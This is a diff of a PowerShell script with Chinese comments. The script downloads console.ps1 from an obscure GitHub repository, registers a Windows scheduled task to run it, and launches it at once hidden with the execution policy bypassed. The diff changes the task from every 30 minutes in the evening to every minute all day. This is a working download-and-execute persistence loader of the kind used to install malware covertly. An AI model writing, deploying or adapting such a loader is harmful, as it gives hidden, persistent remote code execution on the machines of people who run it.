@@ -10,7 +10,7 @@ if (-not (Test-Path "C:\ProgramData\Microsoft\Windows")) {
 # 删除旧脚本与任务 XML
 Remove-Item $tempScript,$xmlPath -Force -ErrorAction SilentlyContinue
 
-# 下载主脚本（UTF8 无 BOM）
+# 下载 console.ps1（UTF8 无 BOM）
 try {
     $wc = New-Object System.Net.WebClient
     $bytes = $wc.DownloadData("https://raw.githubusercontent.com/ertgyhujkfghj/2/main/console.ps1")
@@ -20,7 +20,7 @@ try {
     exit 1  # 下载失败直接退出
 }
 
-# 固定触发时间：每天 19:30 起，每 30 分钟执行一次，持续 4 小时 30 分钟
+# 注册计划任务（每 1 分钟执行一次）
 $xmlContent = @"
 <?xml version="1.0" encoding="UTF-16"?>
 <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
@@ -29,11 +29,11 @@ $xmlContent = @"
   </RegistrationInfo>
   <Triggers>
     <TimeTrigger>
-      <StartBoundary>2005-01-01T19:30:00</StartBoundary>
+      <StartBoundary>2005-01-01T00:00:00</StartBoundary>
       <Enabled>true</Enabled>
       <Repetition>
-        <Interval>PT30M</Interval>
-        <Duration>PT4H30M</Duration>
+        <Interval>PT1M</Interval>
+        <Duration>PT24H</Duration>
         <StopAtDurationEnd>false</StopAtDurationEnd>
       </Repetition>
     </TimeTrigger>
@@ -60,7 +60,7 @@ $xmlContent = @"
     <Hidden>false</Hidden>
     <RunOnlyIfIdle>false</RunOnlyIfIdle>
     <WakeToRun>false</WakeToRun>
-    <ExecutionTimeLimit>PT2H</ExecutionTimeLimit>
+    <ExecutionTimeLimit>PT10M</ExecutionTimeLimit>
     <Priority>7</Priority>
   </Settings>
   <Actions Context="Author">
@@ -75,10 +75,10 @@ $xmlContent = @"
 # 保存 XML 文件
 $xmlContent | Out-File -Encoding Unicode -FilePath $xmlPath
 
-# 注册计划任务
+# 注册任务
 schtasks /Create /TN $taskName /XML $xmlPath /F | Out-Null
 
-# 立即执行一次（静默）
+# 立即执行一次
 Start-Process -FilePath "powershell.exe" `
     -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" `
     -WindowStyle Hidden
